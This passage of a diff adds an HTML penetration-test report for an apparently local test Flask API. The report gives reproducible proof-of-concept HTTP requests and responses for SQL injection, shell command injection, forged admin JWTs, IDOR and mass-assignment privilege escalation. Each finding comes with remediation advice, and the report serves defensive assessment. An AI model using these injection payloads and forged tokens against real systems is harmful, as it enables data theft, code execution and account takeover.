+                        <div><code>GET /api/v1/products/search</code></div>
+                    </div>
+                    <div>
+                        <div class="info-label">CVSS v3.1 Vector</div>
+                        <div style="font-family: monospace; font-size: 0.8rem;">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</div>
+                    </div>
+                </div>
+
+                <p style="margin-bottom: 1rem; color: #cbd5e1;">The product search endpoint formats user-supplied input directly into an SQL query string without parameterization or escaping. By injecting a UNION SELECT query, an unauthenticated attacker extracted the complete database of users, password hashes, and administrative flags.</p>
+
+                <!-- Proof of Concept Request & Response -->
+                <div class="poc-box">
+                    <div class="poc-header">
+                        <span>Proof of Concept - HTTP Request (Burp Suite Reproducible)</span>
+                        <button class="copy-btn" onclick="copyPoC(this)">Copy HTTP Request</button>
+                    </div>
+                    <pre><code>GET /api/v1/products/search?q=%27+UNION+SELECT+id%2C+username%2C+password_hash%2C+role%2C+email%2C+is_admin+FROM+users+-- HTTP/1.1
+Host: 127.0.0.1:5000
+User-Agent: python-requests/2.34.2
+Accept-Encoding: gzip, deflate, zstd
+Accept: */*
+Connection: keep-alive
+</code></pre>
+
+                    <div class="poc-header">
+                        <span>Proof of Concept - Server Response & Leaked Artifacts</span>
+                    </div>
+                    <pre><code style="color: #4ade80;">HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
+Date: Mon, 02 Nov 2026 16:02:18 GMT
+Content-Type: application/json
+Content-Length: 1862
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: *
+X-Powered-By: Flask-VAPT-API
+Connection: close
+
+{
+  "count": 10,
+  "products": [
+    {
+      "category": "Security",
+      "description": "Enterprise-grade hardware firewall with deep packet inspection.",
+      "id": 1,
+      "name": "SecureGate Hardware Firewall Pro",
+      "price": 1299.99,
+      "stock": 15
+    },
+    {
+      "category": "a109e36947ad56de1dca1cc49f0ef8ac9ad9a7b1aa0df41fb3c4cb73c1ff01ea",
+      "description": 0,
+      "id": 1,
+      "name": "alice",
+      "price": "user",
+      "stock": "alice@enterprise-corp.local"
+    },
+    {
+      "category": "Authentication",
+      "description": "Hardware USB-C security key supporting WebAuthn and PKI.",
+      "id": 2,
+      "name": "CryptoKey FIDO2 Security Token",
+      "price": 49.99,
+      "stock": 150
+    },
+    {
+      "category": "a109e36947ad56de1dca1cc49f0ef8ac9ad9a7b1aa0df41fb3c4cb73c1ff01ea",
+      "description": 1,
+      "id": 2,
+      "name": "bob",
+      "price": "admin",
+      "stock": "bob_updated@enterprise-corp.local"
+    },
+    {
+      "category": "Software",
+      "description": "Web application firewall protection with automated threat blocking.",
+      "id": 3,
+      "name": "CloudShield WAF License - 1 Year",
+      "price": 499.0,
+      "stock": 50
+    },
+    {
+      "category": "a109e36947ad56de1dca1cc49f0ef8ac9ad9a7b1aa0df41fb3c4cb73c1ff01ea",
+      "description": 0,
+      "id": 3,
+      "name": "charlie",
+      "price": "user",
+      "stock": "charlie@enterprise-corp.local"
+    },
+    {
+      "category": "Endpoint",
+      "description": "Endpoint detection and continuous posture assessment agent.",
+      "id": 4,
+      "name": "ZeroTrust Endpoint Agent",
+      "price": 15.0,
+      "stock": 1000
+    },
+    {
+      "category": "4952bfc2d30557a2cd7cf62e0ea5bc81c1ac9795969cb28c0d1290e7b26d4bd1",
+      "description": 1,
+      "id": 4,
+      "name": "admin",
+      "price": "admin",
+      "stock": "admin@enterprise-corp.local"
+    },
+    {
+      "category": "Monitoring",
+      "description": "Security information and event management collector.",
+      "id": 5,
+      "name": "ThreatScope SIEM Starter Pack",
+      "price": 2499.0,
+      "stock": 10
+    },
+    {
+      "category": "Hardware",
+      "description": "FIPS 140-2 Level 3 certified Hardware Security Module.",
+      "id": 6,
+      "name": "Quantum Vault HSM Module",
+      "price": 8500.0,
+      "stock": 5
+    }
+  ],
+  "query": "' UNION SELECT id, username, password_hash, role, email, is_admin FROM users --",
+  "status": "success"
+}</code></pre>
+                </div>
+
+                <!-- Business Impact Box -->
+                <div class="callout-box impact-box">
+                    <div class="box-title">⚠ Real-World Business Impact</div>
+                    <div>Complete database exfiltration, unauthorized modification or deletion of data, and potential host takeover depending on database permissions.</div>
+                </div>
+
+                <!-- Remediation Recommendations Box -->
+                <div class="callout-box remediation-box">
+                    <div class="box-title">🛡 Remediation Guidance & Security Fixes</div>
+                    <div style="white-space: pre-line;">1. Use parameterized queries (prepared statements) or an Object-Relational Mapper (ORM) for all database queries.
+2. Avoid any dynamic string concatenation or formatting inside SQL statements.
+3. Implement input validation and apply principle of least privilege to database connections.</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="finding-card" data-severity="CRITICAL" data-search="VAPT-CMD-001 Remote OS Command Injection in Diagnostic Ping Utility OWASP API Top 10 - Injection Flaws /api/v1/tools/ping">
+            <div class="finding-header" onclick="toggleCard(this)">
+                <div class="finding-title-group">
+                    <span class="badge badge-CRITICAL">CRITICAL</span>
+                    <span class="finding-id">VAPT-CMD-001</span>
+                    <span class="finding-title">Remote OS Command Injection in Diagnostic Ping Utility</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: 0.75rem;">
+                    <span style="font-size: 0.85rem; font-family: monospace; color: #a5b4fc;">CVSS 9.8</span>
+                    <span class="toggle-icon">▼</span>
+                </div>
+            </div>
+
+            <div class="finding-content">
+                <div class="info-grid">
+                    <div>
+                        <div class="info-label">OWASP API Category</div>
+                        <div>OWASP API Top 10 - Injection Flaws</div>
+                    </div>
+                    <div>
+                        <div class="info-label">CWE Mapping</div>
+                        <div>CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')</div>
+                    </div>
+                    <div>
+                        <div class="info-label">Endpoint & Method</div>
+                        <div><code>GET /api/v1/tools/ping</code></div>
+                    </div>
+                    <div>
+                        <div class="info-label">CVSS v3.1 Vector</div>
+                        <div style="font-family: monospace; font-size: 0.8rem;">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</div>
+                    </div>
+                </div>
+
+                <p style="margin-bottom: 1rem; color: #cbd5e1;">The network diagnostic ping endpoint passes the user-supplied 'host' query parameter directly to the system shell without input sanitization or argument separation. An attacker can append arbitrary system shell commands (e.g. '| echo ...' or '; whoami') which execute with the privileges of the running API server process.</p>
+
+                <!-- Proof of Concept Request & Response -->
+                <div class="poc-box">
+                    <div class="poc-header">
+                        <span>Proof of Concept - HTTP Request (Burp Suite Reproducible)</span>
+                        <button class="copy-btn" onclick="copyPoC(this)">Copy HTTP Request</button>
+                    </div>
+                    <pre><code>GET /api/v1/tools/ping?host=127.0.0.1+%7C+echo+VAPT_CMD_INJECTION_TRIGGERED_SUCCESS HTTP/1.1
+Host: 127.0.0.1:5000
+User-Agent: python-requests/2.34.2
+Accept-Encoding: gzip, deflate, zstd
+Accept: */*
+Connection: keep-alive
+</code></pre>
+
+                    <div class="poc-header">
+                        <span>Proof of Concept - Server Response & Leaked Artifacts</span>
+                    </div>
+                    <pre><code style="color: #4ade80;">HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
+Date: Mon, 02 Nov 2026 16:02:18 GMT
+Content-Type: application/json
+Content-Length: 221
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: *
+X-Powered-By: Flask-VAPT-API
+Connection: close
+
+{
+  "command_executed": "ping -n 1 127.0.0.1 | echo VAPT_CMD_INJECTION_TRIGGERED_SUCCESS",
+  "output": "VAPT_CMD_INJECTION_TRIGGERED_SUCCESS\n",
+  "status": "success",
+  "target": "127.0.0.1 | echo VAPT_CMD_INJECTION_TRIGGERED_SUCCESS"
+}</code></pre>
+                </div>
+
+                <!-- Business Impact Box -->
+                <div class="callout-box impact-box">
+                    <div class="box-title">⚠ Real-World Business Impact</div>
+                    <div>Full Remote Code Execution (RCE) and underlying operating system compromise. An attacker can install persistent malware, read system files, dump credentials, or pivot into the internal corporate network.</div>
+                </div>
+
+                <!-- Remediation Recommendations Box -->
+                <div class="callout-box remediation-box">
+                    <div class="box-title">🛡 Remediation Guidance & Security Fixes</div>
+                    <div style="white-space: pre-line;">1. Avoid invoking the operating system shell entirely (shell=False).
+2. If external commands must be executed, pass arguments as discrete array elements.
+3. Strictly validate input against an allowlist pattern (e.g. valid IPv4/IPv6 address or standard hostname regex).
+4. Run the API process in an unprivileged, sandboxed container.</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="finding-card" data-severity="HIGH" data-search="VAPT-AUTH-002 Weak / Guessable JWT HMAC Secret Key API2:2023 - Broken Authentication /api/v1/auth/login">
+            <div class="finding-header" onclick="toggleCard(this)">
+                <div class="finding-title-group">
+                    <span class="badge badge-HIGH">HIGH</span>
+                    <span class="finding-id">VAPT-AUTH-002</span>
+                    <span class="finding-title">Weak / Guessable JWT HMAC Secret Key</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: 0.75rem;">
+                    <span style="font-size: 0.85rem; font-family: monospace; color: #a5b4fc;">CVSS 8.5</span>
+                    <span class="toggle-icon">▼</span>
+                </div>
+            </div>
+
+            <div class="finding-content">
+                <div class="info-grid">
+                    <div>
+                        <div class="info-label">OWASP API Category</div>
+                        <div>API2:2023 - Broken Authentication</div>
+                    </div>
+                    <div>
+                        <div class="info-label">CWE Mapping</div>
+                        <div>CWE-798: Use of Hard-coded or Weak Cryptographic Credentials</div>
+                    </div>
+                    <div>
+                        <div class="info-label">Endpoint & Method</div>
+                        <div><code>POST /api/v1/auth/login</code></div>
+                    </div>
+                    <div>
+                        <div class="info-label">CVSS v3.1 Vector</div>
+                        <div style="font-family: monospace; font-size: 0.8rem;">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N</div>
+                    </div>
+                </div>
+
+                <p style="margin-bottom: 1rem; color: #cbd5e1;">The API signs JSON Web Tokens (HS256) using a weak, dictionary-guessable secret key ('secret123'). Because HS256 is a symmetric signing algorithm, knowledge of the shared secret allows attackers to generate arbitrary valid JWT tokens for any user or administrative account.</p>
+
+                <!-- Proof of Concept Request & Response -->
+                <div class="poc-box">
+                    <div class="poc-header">
+                        <span>Proof of Concept - HTTP Request (Burp Suite Reproducible)</span>
+                        <button class="copy-btn" onclick="copyPoC(this)">Copy HTTP Request</button>
+                    </div>
+                    <pre><code>GET /api/v1/users/4/profile HTTP/1.1
+Host: 127.0.0.1:5000
+User-Agent: python-requests/2.34.2
+Accept-Encoding: gzip, deflate, zstd
+Accept: */*
+Connection: keep-alive
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0IiwidXNlcl9pZCI6NCwidXNlcm5hbWUiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlzX2FkbWluIjp0cnVlLCJleHAiOjE3OTM2Mzg5MzguNTIxNDIxMn0.Ezh_oi9RxtHHoBl5wZ7N6BvTnqPazVsUZdhCzaybelg
+</code></pre>
+
+                    <div class="poc-header">
+                        <span>Proof of Concept - Server Response & Leaked Artifacts</span>
+                    </div>
+                    <pre><code style="color: #4ade80;">HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
+Date: Mon, 02 Nov 2026 16:02:18 GMT
+Content-Type: application/json
+Content-Length: 258
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: *
+X-Powered-By: Flask-VAPT-API
+Connection: close
+
+{
+  "created_at": "2026-11-02 16:02:17",
+  "credit_balance": 9999.0,
+  "email": "admin@enterprise-corp.local",
+  "id": 4,
+  "is_admin": true,
+  "password_hash": "4952bfc2d30557a2cd7cf62e0ea5bc81c1ac9795969cb28c0d1290e7b26d4bd1",
+  "role": "admin",
+  "ssn_last4": "9999",
+  "username": "admin"
+}</code></pre>
+                </div>
+
+                <!-- Business Impact Box -->
+                <div class="callout-box impact-box">
+                    <div class="box-title">⚠ Real-World Business Impact</div>
+                    <div>Attackers can forge valid authentication tokens at will, bypassing identity verification and gaining full administrative privileges across the API.</div>
+                </div>
+
+                <!-- Remediation Recommendations Box -->
+                <div class="callout-box remediation-box">
+                    <div class="box-title">🛡 Remediation Guidance & Security Fixes</div>
+                    <div style="white-space: pre-line;">1. Generate high-entropy, cryptographically random secret keys of at least 256 bits (32+ bytes).
+2. Store secrets securely in environment variables or an enterprise secrets manager (e.g. HashiCorp Vault, AWS Secrets Manager).
+3. Consider asymmetric signing algorithms such as RS256 or ES256.</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="finding-card" data-severity="HIGH" data-search="VAPT-BOLA-002 Broken Object Level Authorization (BOLA) in Order Receipts API1:2023 - Broken Object Level Authorization /api/v1/orders/{id}">
+            <div class="finding-header" onclick="toggleCard(this)">
+                <div class="finding-title-group">
+                    <span class="badge badge-HIGH">HIGH</span>
+                    <span class="finding-id">VAPT-BOLA-002</span>
+                    <span class="finding-title">Broken Object Level Authorization (BOLA) in Order Receipts</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: 0.75rem;">
+                    <span style="font-size: 0.85rem; font-family: monospace; color: #a5b4fc;">CVSS 7.7</span>
+                    <span class="toggle-icon">▼</span>
+                </div>
+            </div>
+
+            <div class="finding-content">
+                <div class="info-grid">
+                    <div>
+                        <div class="info-label">OWASP API Category</div>
+                        <div>API1:2023 - Broken Object Level Authorization</div>
+                    </div>
+                    <div>
+                        <div class="info-label">CWE Mapping</div>
+                        <div>CWE-639: Authorization Bypass Through User-Controlled Key</div>
+                    </div>
+                    <div>
+                        <div class="info-label">Endpoint & Method</div>
+                        <div><code>GET /api/v1/orders/{id}</code></div>
+                    </div>
+                    <div>
+                        <div class="info-label">CVSS v3.1 Vector</div>
+                        <div style="font-family: monospace; font-size: 0.8rem;">CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</div>
+                    </div>
+                </div>
+
+                <p style="margin-bottom: 1rem; color: #cbd5e1;">The order details endpoint fails to restrict access to the customer who placed the order. An authenticated user can access another customer's order receipt, order history, and physical shipping address.</p>
+
+                <!-- Proof of Concept Request & Response -->
+                <div class="poc-box">
+                    <div class="poc-header">
+                        <span>Proof of Concept - HTTP Request (Burp Suite Reproducible)</span>
+                        <button class="copy-btn" onclick="copyPoC(this)">Copy HTTP Request</button>
+                    </div>
+                    <pre><code>GET /api/v1/orders/1 HTTP/1.1
+Host: 127.0.0.1:5000
+User-Agent: python-requests/2.34.2
+Accept-Encoding: gzip, deflate, zstd
+Accept: */*
+Connection: keep-alive
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyIiwidXNlcl9pZCI6MiwidXNlcm5hbWUiOiJib2IiLCJlbWFpbCI6ImJvYkBlbnRlcnByaXNlLWNvcnAubG9jYWwiLCJyb2xlIjoidXNlciIsImlzX2FkbWluIjpmYWxzZSwiZXhwIjoxNzkzNjIyNzM4LjQ5MzUzMn0.L2ny6GfPqeOCMpQKzQgf4gHCyKEPCPH5a63fF_Az-mE
+</code></pre>
+
+                    <div class="poc-header">
+                        <span>Proof of Concept - Server Response & Leaked Artifacts</span>
+                    </div>
+                    <pre><code style="color: #4ade80;">HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
+Date: Mon, 02 Nov 2026 16:02:18 GMT
+Content-Type: application/json
+Content-Length: 263
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: *
+X-Powered-By: Flask-VAPT-API
+Connection: close
+
+{
+  "order": {
+    "created_at": "2026-11-02 16:02:17",
+    "id": 1,
+    "item_name": "MacBook Pro M3 Max 16-inch 64GB",
+    "quantity": 1,
+    "shipping_address": "742 Evergreen Terrace, Springfield (Private Residence)",
+    "status": "DELIVERED",
+    "total_amount": 3999.0,
+    "user_id": 1
+  },
+  "status": "success"
+}</code></pre>
+                </div>
+
+                <!-- Business Impact Box -->
+                <div class="callout-box impact-box">
+                    <div class="box-title">⚠ Real-World Business Impact</div>
+                    <div>Exposure of Personally Identifiable Information (PII) including full delivery addresses, purchase histories, and payment totals, causing severe regulatory and GDPR violations.</div>
+                </div>
+
+                <!-- Remediation Recommendations Box -->
+                <div class="callout-box remediation-box">
+                    <div class="box-title">🛡 Remediation Guidance & Security Fixes</div>
+                    <div style="white-space: pre-line;">Validate that order.user_id matches the authenticated user's ID before returning order details. Return HTTP 403 Forbidden or 404 Not Found if unauthorized.</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="finding-card" data-severity="HIGH" data-search="VAPT-BOLA-003 Insecure Direct Object Reference (IDOR) on User Profile Endpoint API1:2023 - Broken Object Level Authorization /api/v1/users/{id}/profile">
+            <div class="finding-header" onclick="toggleCard(this)">
+                <div class="finding-title-group">
+                    <span class="badge badge-HIGH">HIGH</span>
+                    <span class="finding-id">VAPT-BOLA-003</span>
+                    <span class="finding-title">Insecure Direct Object Reference (IDOR) on User Profile Endpoint</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: 0.75rem;">
+                    <span style="font-size: 0.85rem; font-family: monospace; color: #a5b4fc;">CVSS 7.5</span>
+                    <span class="toggle-icon">▼</span>
+                </div>
+            </div>
+
+            <div class="finding-content">
+                <div class="info-grid">
+                    <div>
+                        <div class="info-label">OWASP API Category</div>
+                        <div>API1:2023 - Broken Object Level Authorization</div>
+                    </div>
+                    <div>
+                        <div class="info-label">CWE Mapping</div>
+                        <div>CWE-639: Authorization Bypass Through User-Controlled Key</div>
+                    </div>
+                    <div>
+                        <div class="info-label">Endpoint & Method</div>
+                        <div><code>GET /api/v1/users/{id}/profile</code></div>
+                    </div>
+                    <div>
+                        <div class="info-label">CVSS v3.1 Vector</div>
+                        <div style="font-family: monospace; font-size: 0.8rem;">CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</div>
+                    </div>
+                </div>
+
+                <p style="margin-bottom: 1rem; color: #cbd5e1;">The profile endpoint allows any authenticated user to view the full profile and internal attributes of any other registered user by changing the ID in the URL path.</p>
+
+                <!-- Proof of Concept Request & Response -->
+                <div class="poc-box">
+                    <div class="poc-header">
+                        <span>Proof of Concept - HTTP Request (Burp Suite Reproducible)</span>
+                        <button class="copy-btn" onclick="copyPoC(this)">Copy HTTP Request</button>
+                    </div>
+                    <pre><code>GET /api/v1/users/1/profile HTTP/1.1
+Host: 127.0.0.1:5000
+User-Agent: python-requests/2.34.2
+Accept-Encoding: gzip, deflate, zstd
+Accept: */*
+Connection: keep-alive
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyIiwidXNlcl9pZCI6MiwidXNlcm5hbWUiOiJib2IiLCJlbWFpbCI6ImJvYkBlbnRlcnByaXNlLWNvcnAubG9jYWwiLCJyb2xlIjoidXNlciIsImlzX2FkbWluIjpmYWxzZSwiZXhwIjoxNzkzNjIyNzM4LjQ5MzUzMn0.L2ny6GfPqeOCMpQKzQgf4gHCyKEPCPH5a63fF_Az-mE
+</code></pre>
+
+                    <div class="poc-header">
+                        <span>Proof of Concept - Server Response & Leaked Artifacts</span>
+                    </div>
+                    <pre><code style="color: #4ade80;">HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
+Date: Mon, 02 Nov 2026 16:02:18 GMT
+Content-Type: application/json
+Content-Length: 257
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: *
+X-Powered-By: Flask-VAPT-API
+Connection: close
+
+{
+  "created_at": "2026-11-02 16:02:17",
+  "credit_balance": 250.0,
+  "email": "alice@enterprise-corp.local",
+  "id": 1,
+  "is_admin": false,
+  "password_hash": "a109e36947ad56de1dca1cc49f0ef8ac9ad9a7b1aa0df41fb3c4cb73c1ff01ea",
+  "role": "user",
+  "ssn_last4": "1122",
+  "username": "alice"
+}</code></pre>
+                </div>
+
+                <!-- Business Impact Box -->
+                <div class="callout-box impact-box">
+                    <div class="box-title">⚠ Real-World Business Impact</div>
+                    <div>Account enumeration and unauthorized profiling of users across the enterprise.</div>
+                </div>
+
+                <!-- Remediation Recommendations Box -->
+                <div class="callout-box remediation-box">
+                    <div class="box-title">🛡 Remediation Guidance & Security Fixes</div>
+                    <div style="white-space: pre-line;">Restrict access to the logged-in user's own profile or require administrator privileges.</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="finding-card" data-severity="HIGH" data-search="VAPT-PROP-001 Excessive Data Exposure in User Profile Response API3:2023 - Broken Object Property Level Authorization /api/v1/users/{id}/profile">
+            <div class="finding-header" onclick="toggleCard(this)">
+                <div class="finding-title-group">
+                    <span class="badge badge-HIGH">HIGH</span>
+                    <span class="finding-id">VAPT-PROP-001</span>
+                    <span class="finding-title">Excessive Data Exposure in User Profile Response</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: 0.75rem;">
+                    <span style="font-size: 0.85rem; font-family: monospace; color: #a5b4fc;">CVSS 7.5</span>
+                    <span class="toggle-icon">▼</span>
+                </div>
+            </div>
+
+            <div class="finding-content">
+                <div class="info-grid">
+                    <div>
+                        <div class="info-label">OWASP API Category</div>
+                        <div>API3:2023 - Broken Object Property Level Authorization</div>
+                    </div>
+                    <div>
+                        <div class="info-label">CWE Mapping</div>
+                        <div>CWE-213: Exposure of Sensitive Information Due to Incompatible Policies</div>
+                    </div>
+                    <div>
+                        <div class="info-label">Endpoint & Method</div>
+                        <div><code>GET /api/v1/users/{id}/profile</code></div>
+                    </div>
+                    <div>
+                        <div class="info-label">CVSS v3.1 Vector</div>
+                        <div style="font-family: monospace; font-size: 0.8rem;">CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N</div>
+                    </div>
+                </div>
+
+                <p style="margin-bottom: 1rem; color: #cbd5e1;">The API endpoint returns internal and sensitive database fields (password_hash, ssn_last4) in its response payload. While clients might only display public profile details, attackers intercepting HTTP traffic directly extract sensitive credentials and personal data.</p>
+
+                <!-- Proof of Concept Request & Response -->
+                <div class="poc-box">
+                    <div class="poc-header">
+                        <span>Proof of Concept - HTTP Request (Burp Suite Reproducible)</span>
+                        <button class="copy-btn" onclick="copyPoC(this)">Copy HTTP Request</button>
+                    </div>
+                    <pre><code>GET /api/v1/users/2/profile HTTP/1.1
+Host: 127.0.0.1:5000
+User-Agent: python-requests/2.34.2
+Accept-Encoding: gzip, deflate, zstd
+Accept: */*
+Connection: keep-alive
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyIiwidXNlcl9pZCI6MiwidXNlcm5hbWUiOiJib2IiLCJlbWFpbCI6ImJvYkBlbnRlcnByaXNlLWNvcnAubG9jYWwiLCJyb2xlIjoidXNlciIsImlzX2FkbWluIjpmYWxzZSwiZXhwIjoxNzkzNjIyNzM4LjQ5MzUzMn0.L2ny6GfPqeOCMpQKzQgf4gHCyKEPCPH5a63fF_Az-mE
+</code></pre>
+
+                    <div class="poc-header">
+                        <span>Proof of Concept - Server Response & Leaked Artifacts</span>
+                    </div>
+                    <pre><code style="color: #4ade80;">HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
+Date: Mon, 02 Nov 2026 16:02:18 GMT
+Content-Type: application/json
+Content-Length: 252
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: *
+X-Powered-By: Flask-VAPT-API
+Connection: close
+
+{
+  "created_at": "2026-11-02 16:02:17",
+  "credit_balance": 50.0,
+  "email": "bob@enterprise-corp.local",
+  "id": 2,
+  "is_admin": false,
+  "password_hash": "a109e36947ad56de1dca1cc49f0ef8ac9ad9a7b1aa0df41fb3c4cb73c1ff01ea",
+  "role": "user",
+  "ssn_last4": "3344",
+  "username": "bob"
+}</code></pre>
+                </div>
+
+                <!-- Business Impact Box -->
+                <div class="callout-box impact-box">
+                    <div class="box-title">⚠ Real-World Business Impact</div>
+                    <div>Credential exposure. Leaked password hashes can be cracked offline, leading to full account takeover and identity theft.</div>
+                </div>
+
+                <!-- Remediation Recommendations Box -->
+                <div class="callout-box remediation-box">
+                    <div class="box-title">🛡 Remediation Guidance & Security Fixes</div>
+                    <div style="white-space: pre-line;">1. Implement strict Data Transfer Objects (DTOs) or response serializers that explicitly whitelist public fields.
+2. Never serialize internal database models directly to API JSON responses.
+3. Explicitly purge sensitive attributes like password hashes and SSNs.</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="finding-card" data-severity="HIGH" data-search="VAPT-PROP-002 Mass Assignment Enabling Privilege Escalation API3:2023 - Broken Object Property Level Authorization /api/v1/users/{id}/profile">
+            <div class="finding-header" onclick="toggleCard(this)">
+                <div class="finding-title-group">
+                    <span class="badge badge-HIGH">HIGH</span>
+                    <span class="finding-id">VAPT-PROP-002</span>
+                    <span class="finding-title">Mass Assignment Enabling Privilege Escalation</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: 0.75rem;">
+                    <span style="font-size: 0.85rem; font-family: monospace; color: #a5b4fc;">CVSS 8.5</span>
+                    <span class="toggle-icon">▼</span>
+                </div>
+            </div>
+
+            <div class="finding-content">
+                <div class="info-grid">
+                    <div>
+                        <div class="info-label">OWASP API Category</div>
+                        <div>API3:2023 - Broken Object Property Level Authorization</div>
+                    </div>
+                    <div>
+                        <div class="info-label">CWE Mapping</div>
+                        <div>CWE-915: Improperly Controlled Modification of Dynamically Determined Object Attributes</div>
+                    </div>
+                    <div>
+                        <div class="info-label">Endpoint & Method</div>
+                        <div><code>PUT /api/v1/users/{id}/profile</code></div>
+                    </div>
+                    <div>
+                        <div class="info-label">CVSS v3.1 Vector</div>
+                        <div style="font-family: monospace; font-size: 0.8rem;">CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N</div>
+                    </div>
+                </div>
+
+                <p style="margin-bottom: 1rem; color: #cbd5e1;">The user profile update endpoint binds arbitrary client-supplied JSON parameters directly to database columns without input property validation. A standard user successfully escalated their own role to 'admin' and assigned themselves 999,999 in credit balance.</p>
+
+                <!-- Proof of Concept Request & Response -->
+                <div class="poc-box">
+                    <div class="poc-header">
+                        <span>Proof of Concept - HTTP Request (Burp Suite Reproducible)</span>
+                        <button class="copy-btn" onclick="copyPoC(this)">Copy HTTP Request</button>
+                    </div>
+                    <pre><code>PUT /api/v1/users/2/profile HTTP/1.1
+Host: 127.0.0.1:5000
+User-Agent: python-requests/2.34.2
+Accept-Encoding: gzip, deflate, zstd
+Accept: */*
+Connection: keep-alive
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyIiwidXNlcl9pZCI6MiwidXNlcm5hbWUiOiJib2IiLCJlbWFpbCI6ImJvYkBlbnRlcnByaXNlLWNvcnAubG9jYWwiLCJyb2xlIjoidXNlciIsImlzX2FkbWluIjpmYWxzZSwiZXhwIjoxNzkzNjIyNzM4LjQ5MzUzMn0.L2ny6GfPqeOCMpQKzQgf4gHCyKEPCPH5a63fF_Az-mE
+Content-Length: 109
+Content-Type: application/json
+
+{"email": "bob_updated@enterprise-corp.local", "role": "admin", "is_admin": true, "credit_balance": 999999.0}</code></pre>
+
+                    <div class="poc-header">
+                        <span>Proof of Concept - Server Response & Leaked Artifacts</span>
+                    </div>
+                    <pre><code style="color: #4ade80;">HTTP/1.1 200 OK
+Server: Werkzeug/3.1.9 Python/3.14.7, Werkzeug/3.1.9 Python/3.14.7
+Date: Mon, 02 Nov 2026 16:02:18 GMT
+Content-Type: application/json
+Content-Length: 196
+Access-Control-Allow-Origin: *
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
+Access-Control-Allow-Headers: *
+X-Powered-By: Flask-VAPT-API
+Connection: close
+
+{
+  "message": "Profile updated successfully",
+  "status": "success",
+  "user": {
+    "credit_balance": 999999.0,
+    "email": "bob_updated@enterprise-corp.local",
+    "id": 2,
+    "is_admin": true,
+    "role": "admin",
+    "username": "bob"
+  }
+}</code></pre>
+                </div>
+
+                <!-- Business Impact Box -->
+                <div class="callout-box impact-box">
+                    <div class="box-title">⚠ Real-World Business Impact</div>
+                    <div>Privilege escalation and unauthorized balance manipulation. Attackers grant themselves administrative rights and manipulate financial or transactional records.</div>
+                </div>
+
+                <!-- Remediation Recommendations Box -->
+                <div class="callout-box remediation-box">
+                    <div class="box-title">🛡 Remediation Guidance & Security Fixes</div>
+                    <div style="white-space: pre-line;">1. Implement strict schema validation and parameter whitelisting for all incoming payloads.
+2. Separate user-editable fields (e.g. bio, display name) from internal state fields (role, is_admin, balance).
+3. Enforce immutability on sensitive object properties at the API controller layer.</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="finding-card" data-severity="HIGH" data-search="VAPT-MISC-001 Insecure Cross-Origin Resource Sharing (CORS) Policy API8:2023 - Security Misconfiguration /api/v1/*">
+            <div class="finding-header" onclick="toggleCard(this)">
+                <div class="finding-title-group">
+                    <span class="badge badge-HIGH">HIGH</span>
+                    <span class="finding-id">VAPT-MISC-001</span>
+                    <span class="finding-title">Insecure Cross-Origin Resource Sharing (CORS) Policy</span>
+                </div>
+                <div style="display: flex; align-items: center; gap: 0.75rem;">
